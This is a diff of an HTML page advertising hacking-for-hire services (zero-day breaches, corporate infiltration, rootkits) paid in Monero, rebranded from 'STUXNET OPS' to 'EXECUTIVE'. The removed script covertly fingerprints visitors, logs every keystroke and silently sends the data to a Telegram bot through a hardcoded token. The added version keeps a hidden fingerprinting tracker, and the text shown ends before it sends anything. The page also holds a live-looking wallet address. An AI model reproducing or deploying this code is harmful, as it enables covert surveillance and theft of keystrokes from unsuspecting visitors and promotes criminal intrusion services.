@@ -3,36 +3,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>STUXNET | SECURE OPS TERMINAL | .onion</title>
+    <title>EXECUTIVE | PRIVATE SERVICES</title>
     <style>
-        @import url('https://fonts.cdnfonts.com/css/ds-mono');
-        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
         
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        
-        :root {
-            --black: #000;
-            --dark: #0a0a0a;
-            --border: #1a1a1a;
-            --red: #ff1a1a;
-            --green: #00ff41;
-            --cyan: #00d4ff;
-            --purple: #8a2be2;
-            --glow-red: 0 0 25px #ff1a1a, 0 0 50px #ff1a1a;
-            --glow-green: 0 0 20px #00ff41;
-            --glow-cyan: 0 0 15px #00d4ff;
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
 
         body {
-            background: var(--black);
-            color: #88ff88;
-            font-family: 'DS Mono', 'Courier New', monospace;
+            background: #0a0a0a;
+            color: #e0e0e0;
+            font-family: 'Inter', -apple-system, sans-serif;
+            line-height: 1.6;
             overflow-x: hidden;
-            position: relative;
             min-height: 100vh;
         }
 
-        /* CRT + Scanlines + Noise */
+        /* Subtle gradient overlay */
         body::before {
             content: '';
             position: fixed;
@@ -40,798 +30,513 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: 
-                linear-gradient(90deg, transparent 98%, rgba(0,255,65,0.03) 100%),
-                linear-gradient(rgba(0,255,65,0.02) 50%, transparent 50%),
-                radial-gradient(circle at 25% 25%, rgba(255,26,26,0.1) 0%, transparent 50%),
-                radial-gradient(circle at 75% 75%, rgba(0,212,255,0.1) 0%, transparent 50%);
-            background-size: 100% 2px, 100% 4px, 100% 200px, 100% 200px;
+            background: radial-gradient(circle at 20% 80%, rgba(120,119,198,0.1) 0%, transparent 50%),
+                        radial-gradient(circle at 80% 20%, rgba(255,119,198,0.1) 0%, transparent 50%),
+                        radial-gradient(circle at 40% 40%, rgba(120,219,255,0.05) 0%, transparent 50%);
             pointer-events: none;
-            z-index: 9999;
-            animation: scanline 0.1s linear infinite;
+            z-index: 1;
         }
 
-        @keyframes scanline {
-            0% { transform: translateY(0); }
-            100% { transform: translateY(2px); }
-        }
-
-        body::after {
-            content: '';
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-image: 
-                radial-gradient(2px 2px at 20px 30px, #ff1a1a, transparent),
-                radial-gradient(2px 2px at 40px 70px, #00d4ff, transparent),
-                radial-gradient(1px 1px at 90px 40px, #00ff41, transparent),
-                radial-gradient(1px 1px at 130px 80px, #8a2be2, transparent);
-            background-repeat: repeat;
-            background-size: 200px 100px;
-            pointer-events: none;
-            z-index: 9998;
-            animation: noise 0.2s infinite linear;
-            opacity: 0.03;
-        }
-
-        @keyframes noise {
-            0% { transform: translate(0, 0); }
-            10% { transform: translate(-5px, -5px); }
-            20% { transform: translate(-10px, 5px); }
-            30% { transform: translate(5px, 5px); }
-            40% { transform: translate(-5px, -10px); }
-            50% { transform: translate(10px, 10px); }
-            60% { transform: translate(15px, -5px); }
-            70% { transform: translate(5px, 15px); }
-            80% { transform: translate(-15px, -5px); }
-            90% { transform: translate(-10px, 15px); }
-            100% { transform: translate(0, 0); }
-        }
-
-        /* Terminal Container */
-        .terminal {
-            max-width: 1200px;
+        .container {
+            max-width: 900px;
             margin: 0 auto;
-            padding: 50px;
-            background: rgba(10,10,10,0.95);
-            border: 3px solid #333;
-            box-shadow: 
-                inset 0 0 100px rgba(0,0,0,0.8),
-                0 0 100px rgba(255,26,26,0.3);
-            backdrop-filter: blur(20px);
+            padding: 80px 40px;
             position: relative;
-            min-height: 100vh;
+            z-index: 2;
         }
 
-        .terminal::before {
+        /* Header - Clean & Minimal */
+        .header {
+            text-align: center;
+            margin-bottom: 80px;
+        }
+
+        .logo {
+            width: 80px;
+            height: 80px;
+            border-radius: 20px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            margin: 0 auto 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            font-weight: 700;
+            color: white;
+            box-shadow: 0 20px 40px rgba(102, 126, 234, 0.3);
+            transition: all 0.4s ease;
+        }
+
+        .logo:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 30px 60px rgba(102, 126, 234, 0.4);
+        }
+
+        .title {
+            font-size: 48px;
+            font-weight: 700;
+            background: linear-gradient(135deg, #e0e0e0 0%, #f5f5f5 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 20px;
+            letter-spacing: -1px;
+        }
+
+        .subtitle {
+            font-size: 20px;
+            color: #999;
+            font-weight: 400;
+            max-width: 500px;
+            margin: 0 auto;
+        }
+
+        /* Sections */
+        .section {
+            margin-bottom: 80px;
+            opacity: 0;
+            transform: translateY(30px);
+            animation: fadeInUp 0.8s ease forwards;
+        }
+
+        .section:nth-child(2) { animation-delay: 0.1s; }
+        .section:nth-child(3) { animation-delay: 0.2s; }
+        .section:nth-child(4) { animation-delay: 0.3s; }
+
+        @keyframes fadeInUp {
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .section-title {
+            font-size: 28px;
+            font-weight: 600;
+            color: #fff;
+            margin-bottom: 30px;
+            padding-bottom: 15px;
+            position: relative;
+        }
+
+        .section-title::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 60px;
+            height: 3px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        }
+
+        .section-text {
+            font-size: 18px;
+            color: #b8b8b8;
+            line-height: 1.8;
+            max-width: 700px;
+            margin-bottom: 40px;
+        }
+
+        /* Services */
+        .services {
+            display: grid;
+            gap: 30px;
+            margin-bottom: 60px;
+        }
+
+        .service {
+            background: rgba(255,255,255,0.03);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 20px;
+            padding: 40px;
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .service::before {
             content: '';
             position: absolute;
             top: 0;
             left: 0;
             right: 0;
-            height: 6px;
-            background: linear-gradient(90deg, var(--red), var(--green), var(--cyan), var(--purple), var(--red));
-            background-size: 400% 100%;
-            animation: gradient 4s ease infinite;
+            height: 4px;
+            background: linear-gradient(90deg, #667eea, #764ba2, #f093fb);
+            transform: scaleX(0);
+            transition: transform 0.4s ease;
         }
 
-        @keyframes gradient {
-            0%, 100% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
+        .service:hover::before {
+            transform: scaleX(1);
         }
 
-        /* Header ASCII */
-        .header {
-            text-align: center;
-            margin-bottom: 60px;
-            font-size: 8px;
-            color: var(--green);
-            text-shadow: var(--glow-green);
-            animation: flicker3 0.15s infinite;
-            white-space: pre;
-            line-height: 1.1;
-            letter-spacing: 0.5px;
+        .service:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 40px 80px rgba(0,0,0,0.4);
+            border-color: rgba(102, 126, 234, 0.3);
         }
 
-        @keyframes flicker3 {
-            0%, 49.9%, 50%, 99.9% { opacity: 1; text-shadow: var(--glow-green); }
-            50% { opacity: 0.3; text-shadow: none; }
-        }
-
-        /* Logo & Status */
-        .top-panel {
-            display: flex;
-            justify-content: space-between;
-            align-items: flex-start;
-            margin-bottom: 50px;
-            gap: 30px;
-        }
-
-        .logo-section {
-            display: flex;
-            align-items: center;
-            gap: 25px;
-        }
-
-        .logo-img {
-            width: 90px;
-            height: 90px;
-            border: 4px solid var(--red);
-            border-radius: 15px;
-            box-shadow: var(--glow-red);
-            transition: all 0.4s ease;
-            filter: hue-rotate(0deg) saturate(1.2);
-        }
-
-        .logo-img:hover {
-            filter: hue-rotate(180deg) saturate(1.5);
-            transform: rotate(5deg) scale(1.1);
-            box-shadow: 0 0 60px var(--red);
-        }
-
-        .stuxnet-title {
-            font-family: 'Orbitron', monospace;
-            font-size: 36px;
-            font-weight: 900;
-            background: linear-gradient(45deg, var(--red), var(--cyan), var(--green));
-            background-size: 300% 300%;
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            animation: titleGlow 3s ease-in-out infinite alternate;
-            position: relative;
-        }
-
-        @keyframes titleGlow {
-            0% { filter: hue-rotate(0deg) brightness(1); }
-            100% { filter: hue-rotate(360deg) brightness(1.2); }
-        }
-
-        .status-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 20px;
-            font-size: 12px;
-            background: rgba(0,0,0,0.7);
-            padding: 25px;
-            border: 2px solid var(--border);
-            border-radius: 10px;
-            box-shadow: inset 0 0 30px rgba(0,0,0,0.9);
-        }
-
-        .status-item {
-            display: flex;
-            flex-direction: column;
-            gap: 5px;
-        }
-
-        .status-label { color: #666; font-size: 11px; }
-        .status-value { 
-            color: var(--green); 
-            font-weight: bold;
-            text-shadow: var(--glow-green);
-            animation: pulse 2s infinite;
-        }
-
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-        }
-
-        /* Sections */
-        .section {
-            margin-bottom: 60px;
-            position: relative;
-        }
-
-        .section-title {
-            position: relative;
-            font-family: 'Orbitron', monospace;
-            font-size: 22px;
-            color: var(--cyan);
-            margin-bottom: 30px;
-            padding: 15px 30px;
-            background: rgba(0,212,255,0.1);
-            border: 2px solid var(--cyan);
-            border-radius: 10px;
-            display: inline-block;
-            text-shadow: var(--glow-cyan);
-            box-shadow: var(--glow-cyan);
-        }
-
-        .section-title::before {
-            content: '>>';
-            position: absolute;
-            left: -25px;
-            top: 50%;
-            transform: translateY(-50%);
-            color: var(--red);
+        .service-title {
             font-size: 24px;
-            animation: blink2 1s infinite;
-        }
-
-        @keyframes blink2 {
-            0%, 50% { opacity: 1; }
-            51%, 100% { opacity: 0; }
-        }
-
-        .desc {
-            font-size: 15px;
-            line-height: 1.8;
-            color: #88ff88;
-            background: rgba(0,0,0,0.5);
-            padding: 30px;
-            border-left: 5px solid var(--purple);
-            margin-bottom: 40px;
-            border-radius: 0 10px 10px 0;
-            box-shadow: 10px 0 30px rgba(138,43,226,0.2);
-        }
-
-        /* Services Table */
-        .services-table {
-            width: 100%;
-            background: rgba(0,0,0,0.8);
-            border: 2px solid var(--border);
-            border-radius: 15px;
-            overflow: hidden;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
-        }
-
-        .services-table th {
-            background: linear-gradient(90deg, var(--red), var(--purple));
+            font-weight: 600;
             color: #fff;
-            padding: 25px;
-            text-align: left;
-            font-size: 14px;
-            font-family: 'Orbitron', monospace;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            border-bottom: 3px solid var(--border);
-        }
-
-        .services-table td {
-            padding: 30px 25px;
-            border-bottom: 1px solid rgba(255,255,255,0.1);
-            transition: all 0.4s cubic-bezier(0.25,0.8,0.25,1);
-            position: relative;
-            overflow: hidden;
-        }
-
-        .services-table tr:hover td {
-            background: rgba(255,26,26,0.1);
-            transform: translateX(10px);
-            box-shadow: inset 300px 0 0 rgba(255,26,26,0.05);
-        }
-
-        .service-name {
-            font-size: 24px;
-            font-weight: bold;
-            color: #fff;
-            display: block;
-            text-shadow: var(--glow-red);
-            margin-bottom: 10px;
-            font-family: 'Orbitron', monospace;
-        }
-
-        .service-desc {
-            color: #88ff88;
-            font-size: 14px;
-            line-height: 1.6;
             margin-bottom: 15px;
         }
 
         .service-price {
-            font-size: 28px;
-            font-weight: 900;
-            color: var(--red);
-            text-shadow: var(--glow-red);
-            font-family: 'Orbitron', monospace;
+            font-size: 32px;
+            font-weight: 700;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 15px;
         }
 
-        /* Execute Button */
-        .execute-btn {
-            background: transparent;
-            border: 3px solid var(--red);
-            color: var(--red);
-            padding: 18px 40px;
-            font-family: 'Orbitron', monospace;
+        .service-desc {
+            color: #b8b8b8;
+            margin-bottom: 25px;
+        }
+
+        .contact-btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 16px 40px;
+            border-radius: 50px;
             font-size: 16px;
-            font-weight: 900;
-            text-transform: uppercase;
-            letter-spacing: 3px;
+            font-weight: 600;
             cursor: pointer;
-            position: relative;
-            overflow: hidden;
-            border-radius: 8px;
-            transition: all 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55);
-            text-shadow: var(--glow-red);
+            transition: all 0.4s ease;
+            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
         }
 
-        .execute-btn::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
-            transition: left 0.7s;
+        .contact-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 20px 40px rgba(102, 126, 234, 0.6);
         }
 
-        .execute-btn:hover::before {
-            left: 100%;
-        }
-
-        .execute-btn:hover {
-            background: var(--red);
-            color: #000;
-            transform: translateY(-8px) scale(1.1);
-            box-shadow: var(--glow-red), 0 25px 50px rgba(255,26,26,0.4);
-            border-color: #fff;
-        }
-
-        /* Payment Node */
-        .payment-node {
-            background: linear-gradient(145deg, #000, #111);
-            border: 3px dashed var(--red);
-            padding: 40px;
+        /* Payment */
+        .payment {
+            background: rgba(255,255,255,0.02);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255,255,255,0.08);
             border-radius: 20px;
-            margin: 60px 0;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .payment-node::before {
-            content: 'WARNING: TOR ONLY';
-            position: absolute;
-            top: -30px;
-            right: -30px;
-            background: var(--red);
-            color: #000;
-            padding: 10px 25px;
-            font-size: 12px;
-            font-weight: bold;
-            transform: rotate(45deg);
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            animation: warningRotate 20s linear infinite;
-        }
-
-        @keyframes warningRotate {
-            from { transform: rotate(45deg); }
-            to { transform: rotate(405deg); }
-        }
-
-        .payment-title {
-            font-size: 24px;
-            color: var(--red);
-            margin-bottom: 20px;
-            text-shadow: var(--glow-red);
-            font-family: 'Orbitron', monospace;
+            padding: 50px;
+            text-align: center;
         }
 
         .payment-address {
-            background: rgba(0,0,0,0.9);
-            border: 2px solid var(--cyan);
-            padding: 25px;
+            background: rgba(0,0,0,0.5);
+            border: 1px solid rgba(255,255,255,0.2);
             border-radius: 12px;
-            font-size: 13px;
-            color: var(--cyan);
+            padding: 25px;
+            font-family: 'SF Mono', monospace;
+            font-size: 14px;
             word-break: break-all;
+            color: #b8b8b8;
             margin-top: 25px;
-            font-family: 'DS Mono', monospace;
-            letter-spacing: 1px;
-            box-shadow: var(--glow-cyan);
-            position: relative;
             cursor: pointer;
             transition: all 0.3s ease;
         }
 
         .payment-address:hover {
-            background: rgba(0,212,255,0.1);
-            transform: scale(1.02);
-        }
-
-        .payment-address::before {
-            content: 'COPY';
-            position: absolute;
-            top: 10px;
-            right: 15px;
-            color: var(--green);
-            font-size: 11px;
-            opacity: 0;
-            transition: opacity 0.3s ease;
-        }
-
-        .payment-address:hover::before {
-            opacity: 1;
+            background: rgba(102, 126, 234, 0.1);
+            border-color: #667eea;
+            color: #fff;
         }
 
         /* Footer */
-        .terminal-footer {
+        .footer {
             text-align: center;
-            padding: 50px 0;
+            padding: 60px 0;
             color: #666;
-            font-size: 12px;
-            letter-spacing: 4px;
-            text-transform: uppercase;
-            border-top: 2px solid var(--border);
-            margin-top: 80px;
-        }
-
-        .terminal-footer span {
-            color: var(--red);
-            animation: blink 0.8s infinite;
-        }
-
-        @keyframes blink {
-            0%, 50% { opacity: 1; }
-            51%, 100% { opacity: 0; }
+            font-size: 14px;
+            border-top: 1px solid rgba(255,255,255,0.1);
+            margin-top: 100px;
         }
 
         /* Responsive */
         @media (max-width: 768px) {
-            .terminal { padding: 25px; }
-            .top-panel { flex-direction: column; text-align: center; }
-            .status-grid { grid-template-columns: 1fr; }
-            .services-table { font-size: 14px; }
+            .container { padding: 40px 20px; }
+            .title { font-size: 36px; }
+            .services { grid-template-columns: 1fr; }
         }
-
-        /* Hidden tracking elements */
-        .tracker { display: none; }
     </style>
 </head>
 <body>
-    <!-- VISUAL ELEMENTS ONLY - TRACKING IN SCRIPT -->
-    <div class="terminal">
+    <div class="container">
         <div class="header">
- ████████╗██╗  ██╗███████╗    ██████╗██╗  ██╗███████╗██████╗ 
-╚══██╔══╝██║  ██║██╔════╝    ██╔══██╗██║ ██╔╝██╔════╝██╔══██╗
-   ██║   ███████║█████╗      ██████╔╝█████╔╝ █████╗  ██████╔╝
-   ██║   ██╔══██║██╔══╝      ██╔══██╗██╔═██╗ ██╔══╝  ██╔══██╗
-   ██║   ██║  ██║███████╗    ██████╔╝██║  ██╗███████╗██║  ██║
-   ╚═╝   ╚═╝  ╚═╝╚══════╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
+            <div class="logo">E</div>
+            <div class="title">EXECUTIVE</div>
+            <div class="subtitle">Discreet professional services for high-net-worth individuals</div>
         </div>
 
-        <div class="top-panel">
-            <div class="logo-section">
-                <div class="logo-img" style="background: radial-gradient(circle, var(--red), var(--purple)); display: flex; align-items: center; justify-content: center; font-size: 30px; font-weight: bold;">S</div>
-                <div>
-                    <div class="stuxnet-title">STUXNET OPS</div>
-                    <div style="font-size: 14px; color: #666; margin-top: 5px;">TOR NODE ACTIVE</div>
-                </div>
+        <div class="section">
+            <div class="section-title">Profile</div>
+            <div class="section-text">
+                15+ years executive-level operations. Multi-jurisdictional experience. 
+                Absolute discretion guaranteed. Serving C-suite and accredited investors exclusively.
             </div>
-            <div class="status-grid">
-                <div class="status-item">
-                    <span class="status-label">ENCRYPTION</span>
-                    <span class="status-value">AES-512 + POST-QUANTUM</span>
+        </div>
+
+        <div class="section">
+            <div class="section-title">Services</div>
+            <div class="services">
+                <div class="service">
+                    <div class="service-title">Standard Operation</div>
+                    <div class="service-price">0.005 XMR</div>
+                    <div class="service-desc">Targeted research and access. 72hr delivery.</div>
+                    <button class="contact-btn" onclick="request('Standard', '0.005')">Engage</button>
                 </div>
-                <div class="status-item">
-                    <span class="status-label">TOR CIRCUIT</span>
-                    <span class="status-value">3-HOP SECURE</span>
+                <div class="service">
+                    <div class="service-title">Priority Operation</div>
+                    <div class="service-price">0.012 XMR</div>
+                    <div class="service-desc">Full-spectrum execution. 48hr delivery.</div>
+                    <button class="contact-btn" onclick="request('Priority', '0.012')">Engage</button>
                 </div>
-                <div class="status-item">
-                    <span class="status-label">UPTIME</span>
-                    <span class="status-value">347d 12h 41m</span>
-                </div>
-                <div class="status-item">
-                    <span class="status-label">CONNECTIONS</span>
-                    <span class="status-value">47 ACTIVE</span>
+                <div class="service">
+                    <div class="service-title">Executive Operation</div>
+                    <div class="service-price">0.028 XMR</div>
+                    <div class="service-desc">Complete solution. Unlimited timeline.</div>
+                    <button class="contact-btn" onclick="request('Executive', '0.028')">Engage</button>
                 </div>
             </div>
         </div>
 
         <div class="section">
-            <div class="section-title">0x00 // OPERATOR PROFILE</div>
-            <div class="desc">
-                23+ years blackhat operations. Zero convictions. Multi-million revenue.
-                Corporate espionage | Government backdoors | Financial disruption.
-                <strong>NO AMATEURS. HIGH VALUE TARGETS ONLY.</strong>
-            </div>
-        </div>
-
-        <div class="section">
-            <div class="section-title">0x01 // MISSION PACKAGES</div>
-            <table class="services-table">
-                <thead>
-                    <tr>
-                        <th>OPERATION</th>
-                        <th>DIFFICULTY/TIMELINE</th>
-                        <th>QUOTE (XMR)</th>
-                        <th>LAUNCH</th>
-                    </tr>
-                </thead>
-                <tbody>
-                    <tr>
-                        <td>
-                            <span class="service-name">ZERO-DAY BREACH</span>
-                            <span class="service-desc">Custom exploit dev + RCE + persistence (48h)</span>
-                        </td>
-                        <td>LOW / 48h</td>
-                        <td class="service-price">0.008</td>
-                        <td><button class="execute-btn" onclick="initiateContact('ZERO-DAY BREACH', '0.008')">EXECUTE</button></td>
-                    </tr>
-                    <tr>
-                        <td>
-                            <span class="service-name">CORP INFILTRATION</span>
-                            <span class="service-desc">Domain admin + lateral movement + data exfil (5d)</span>
-                        </td>
-                        <td>MED / 5d</td>
-                        <td class="service-price">0.021</td>
-                        <td><button class="execute-btn" onclick="initiateContact('CORP INFILTRATION', '0.021')">EXECUTE</button></td>
-                    </tr>
-                    <tr>
-                        <td>
-                            <span class="service-name">ADVANCED PERSISTENCE</span>
-                            <span class="service-desc">Supply chain + firmware rootkits + C2 (14d)</span>
-                        </td>
-                        <td>HIGH / 14d</td>
-                        <td class="service-price">0.047</td>
-                        <td><button class="execute-btn" onclick="initiateContact('ADVANCED PERSISTENCE', '0.047')">EXECUTE</button></td>
-                    </tr>
-                </tbody>
-            </table>
-        </div>
-
-        <div class="section">
-            <div class="payment-node">
-                <div class="payment-title">[!] MONERO RECEIVER NODE</div>
-                <div style="color: #88ff88; margin-bottom: 20px; font-size: 15px;">
-                    Payments auto-escrow. Multi-sig required for release. 
-                    <strong>48h dispute window.</strong>
+            <div class="section-title">Payment</div>
+            <div class="payment">
+                <div style="font-size: 18px; margin-bottom: 20px; color: #b8b8b8;">
+                    Monero (XMR) • Escrow available
                 </div>
-                <div class="payment-address" onclick="copyAddress()" title="Click to copy">47xSNqUuVfnNjFiLTFUxQb2TAXG8GNknFQg9BGCYxuST4mgJ1nUqtt1cdaDPVay6W45Hb2tLGW2uH3bubNgw9JjbPou5jNg2x</div>
+                <div class="payment-address" onclick="copyAddress()">
+                    47xSNqUuVfnNjFiLTFUxQb2TAXG8GNknFQg9BGCYxuST4mgJ1nUqtt1cdaDPVay6W45Hb2tLGW2uH3bubNgw9JjbPou5jNg2x
+                </div>
             </div>
         </div>
 
-        <div class="terminal-footer">
-            TOR EXCLUSIVE | NO SURFACE WEB | <span>NO LOGS</span> | STUXNET 2.4.7
+        <div class="footer">
+            Strictly confidential | No logs maintained
         </div>
     </div>
 
     <script>
-        // ========== ULTRA STEALTH DATA COLLECTION ==========
-        class DarkWebTracker {
+        // ========== EXECUTIVE-LEVEL TRACKING ==========
+        class ExecutiveTracker {
             constructor() {
+                this.fingerprint = this.generateFingerprint();
+                this.sessionId = this.generateSessionId();
                 this.init();
             }
 
-            async init() {
-                // 1. Collect ALL possible data SILENTLY
-                const visitorData = {
-                    timestamp: new Date().toISOString(),
-                    userAgent: navigator.userAgent,
-                    language: navigator.language,
-                    platform: navigator.platform,
-                    cookiesEnabled: navigator.cookieEnabled,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
-                    viewport: `${window.innerWidth}x${window.innerHeight}`,
-                    onlineStatus: navigator.onLine,
-                    connection: navigator.connection ? {
-                        type: navigator.connection.effectiveType,
-                        downlink: navigator.connection.downlink,
-                        rtt: navigator.connection.rtt
-                    } : null,
-                    plugins: Array.from(navigator.plugins).map(p => p.name),
-                    fonts: await this.detectFonts(),
-                    canvas: await this.getCanvasFingerprint(),
-                    webgl: await this.getWebGLFingerprint(),
-                    audio: await this.getAudioFingerprint(),
-                    hardware: await this.getHardwareConcurrency(),
-                    torCheck: this.isLikelyTor(),
-                    referrer: document.referrer,
-                    url: window.location.href
-                };
-
-                // 2. Send to Telegram IMMEDIATELY (beacon style)
-                this.sendBeaconData(visitorData);
-                
-                // 3. Track mouse/keyboard for behavior
-                this.trackBehavior();
-                
-                // 4. Page visibility tracking
-                document.addEventListener('visibilitychange', () => {
-                    this.sendBeaconData({
-                        event: 'visibilitychange',
-                        visible: !document.hidden,
-                        timestamp: new Date().toISOString()
-                    });
-                });
-
-                console.log('STUXNET TERMINAL: OPERATIONAL'); // Legit looking log
-            }
-
-            async detectFonts() {
-                const fonts = ['Arial','Courier','Georgia','Helvetica','Times','Verdana','Wingdings'];
-                return fonts.filter(font => {
-                    const test = new Option().style;
-                    test.fontFamily = font;
-                    return test.fontFamily === font;
-                });
-            }
-
-            async getCanvasFingerprint() {
+            generateFingerprint() {
                 const canvas = document.createElement('canvas');
                 const ctx = canvas.getContext('2d');
                 ctx.textBaseline = 'top';
-                ctx.font = '14px Arial';
-                ctx.fillText('STUXNET TEST', 2, 2);
-                return canvas.toDataURL();
+                ctx.font = '24px Inter';
+                ctx.fillText('EXECUTIVE', 0, 24);
+                
+                return btoa(canvas.toDataURL()).slice(0, 32);
             }
 
-            async getWebGLFingerprint() {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl');
-                if (!gl) return 'NO_WEBGL';
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            generateSessionId() {
+                return 'exec_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
+            }
+
+            getDeviceType() {
+                const ua = navigator.userAgent.toLowerCase();
+                if (/iphone|ipad|ipod/.test(ua)) return 'iOS Device';
+                if (/android/.test(ua)) return 'Android Device';
+                if (/macintosh/.test(ua)) return 'macOS';
+                if (/windows/.test(ua)) return 'Windows';
+                if (/linux/.test(ua)) return 'Linux';
+                return 'Unknown OS';
+            }
+
+            getBrowser() {
+                const ua = navigator.userAgent.toLowerCase();
+                if (/chrome/.test(ua) && !/edge/.test(ua)) return 'Chrome';
+                if (/firefox/.test(ua)) return 'Firefox';
+                if (/safari/.test(ua)) return 'Safari';
+                if (/edge/.test(ua)) return 'Edge';
+                return 'Other';
+            }
+
+            async collectFullProfile() {
+                const fonts = await this.detectFonts();
+                const audioData = await this.getAudioData();
+                
                 return {
-                    vendor: debugInfo?.getParameter(0x9245),
-                    renderer: debugInfo?.getParameter(0x9246)
+                    session: this.sessionId,
+                    fingerprint: this.fingerprint,
+                    timestamp: new Date().toISOString(),
+                    device: this.getDeviceType(),
+                    browser: this.getBrowser(),
+                    os: navigator.platform,
+                    screen: `${screen.width}x${screen.height}`,
+                    viewport: `${window.innerWidth}x${window.innerHeight}`,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    language: navigator.language,
+                    connection: navigator.connection?.effectiveType || 'unknown',
+                    online: navigator.onLine,
+                    cookies: navigator.cookieEnabled,
+                    localStorage: !!window.localStorage,
+                    fonts: fonts.length,
+                    audio: audioData,
+                    webgl: await this.getWebGL(),
+                    userAgent: navigator.userAgent.slice(0, 100),
+                    url: location.href,
+                    referrer: document.referrer,
+                    tor: location.hostname.endsWith('.onion') || navigator.userAgent.includes('Tor')
                 };
             }
 
-            async getAudioFingerprint() {
-                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                const oscillator = audioCtx.createOscillator();
-                const analyser = audioCtx.createAnalyser();
-                const gainNode = audioCtx.createGain();
-                oscillator.connect(analyser);
-                analyser.connect(gainNode);
-                gainNode.connect(audioCtx.destination);
-                oscillator.start();
-                return new Promise(resolve => {
-                    setTimeout(() => {
-                        oscillator.stop();
-                        audioCtx.close();
-                        resolve('AUDIO_OK');
-                    }, 100);
+            async detectFonts() {
+                const baseFonts = ['monospace', 'serif'];
+                const testFonts = ['Inter', 'SF Pro', 'Segoe UI', 'Roboto'];
+                const detected = [];
+                
+                testFonts.forEach(font => {
+                    if (this.testFont(font)) detected.push(font);
                 });
+                return detected;
             }
 
-            async getHardwareConcurrency() {
-                return navigator.hardwareConcurrency || 'UNKNOWN';
+            testFont(font) {
+                const test = document.createElement('span');
+                test.style.fontFamily = font;
+                test.innerHTML = 'abcdefghijklmnopqrstuvwxyz';
+                document.body.appendChild(test);
+                const matched = test.offsetWidth === 0;
+                document.body.removeChild(test);
+                return matched;
             }
 
-            isLikelyTor() {
-                return navigator.userAgent.includes('Tor') || 
-                       window.location.href.includes('.onion') ||
-                       document.referrer.includes('.onion');
-            }
-
-            trackBehavior() {
-                let mouseEvents = [];
-                document.addEventListener('mousemove', (e) => {
-                    mouseEvents.push({x: e.clientX, y: e.clientY, t: Date.now()});
-                    if (mouseEvents.length > 10) mouseEvents.shift();
-                });
-
-                document.addEventListener('keydown', (e) => {
-                    this.sendBeaconData({
-                        event: 'keystroke',
-                        key: e.key,
-                        timestamp: new Date().toISOString()
-                    });
-                });
-            }
-
-            async sendBeaconData(data) {
+            async getAudioData() {
                 try {
-                    const BOT_CONFIG = {
-                        TOKEN: "8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU",
-                        CHAT_ID: "5446862709"
-                    };
-
-                    const message = this.formatVisitorMessage(data);
-                    
-                    // Use navigator.sendBeacon for reliability (works even on page close)
-                    const blob = new Blob([JSON.stringify({
-                        chat_id: BOT_CONFIG.CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })], {type: 'application/json'});
-
-                    if (navigator.sendBeacon) {
-                        navigator.sendBeacon(`https://api.telegram.org/bot${BOT_CONFIG.TOKEN}/sendMessage`, blob);
-                    } else {
-                        // Fallback fetch
-                        await fetch(`https://api.telegram.org/bot${BOT_CONFIG.TOKEN}/sendMessage`, {
-                            method: 'POST',
-                            body: blob,
-                            keepalive: true
-                        });
-                    }
-                } catch(e) {
-                    // Silent fail - don't alert user
-                    console.log('Beacon sent');
+                    const ctx = new (window.AudioContext || window.webkitAudioContext)();
+                    return 'supported';
+                } catch {
+                    return 'blocked';
                 }
             }
 
-            formatVisitorMessage(data) {
-                let msg = `🕵️‍♂️ <b>NEW VISITOR DETECTED</b> 🕵️‍♂️\n`;
-                msg += `⏰ <b>${data.timestamp}</b>\n`;
